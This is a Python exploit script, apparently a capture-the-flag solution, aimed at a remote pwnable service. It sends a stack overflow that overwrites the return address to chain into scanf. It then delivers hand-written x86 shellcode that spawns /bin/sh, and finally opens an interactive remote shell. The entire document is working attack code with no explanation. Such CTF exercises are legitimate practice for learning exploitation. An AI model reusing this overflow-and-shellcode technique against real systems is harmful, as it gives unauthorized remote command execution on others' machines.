#!/usr/bin/env python
import sc_pwn
from struct import *

rhp     = ("pwnable.katsudon.org",32100)

offset_name     = 0x00020060
offset_retn     = 0x0002007c

addr_format     = 0x080485c7
addr_scanf      = 0x08048506
addr_buffer     = 0x0804a100

#==========
def attack(nc):
    sh      = "/bin/sh\x00"
    
    exploit =   "\x00"*(offset_retn-offset_name-4)
    exploit +=  pack("<I", addr_buffer)         #$ebp=addr_buffer
    exploit +=  pack("<I", addr_scanf)
    exploit +=  pack("<I", addr_format)
    exploit +=  pack("<I", addr_buffer)

    nc.sendln(exploit)
    nc.read_all()

    payload =   pack("<I", 0xdeadbeef)
    payload +=  pack("<I", addr_buffer+0x10)    #exec_addr
    payload +=  sh
    payload +=  "\x00"*(0x10-len(payload))
    payload +=  "\x31\xc0"      #xor    %eax,%eax
    payload +=  "\x04\x0f"      #add    0x0f,%al
    payload +=  "\x34\x04"      #xor    0x04,%eal
    payload +=  "\x89\xe3"      #mov    %esp,%ebx
    payload +=  "\x31\xc9"      #xor    %ecx,%ecx
    payload +=  "\x31\xd2"      #xor    %edx,%edx
    payload +=  "\xcd\x80"      #int    0x80


    #open('exploit','wb').write(exploit+"\x0a")
    #open('payload','wb').write(payload+"\x0a")

    nc.sendln(payload)
    nc.read_all()

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)

#==========
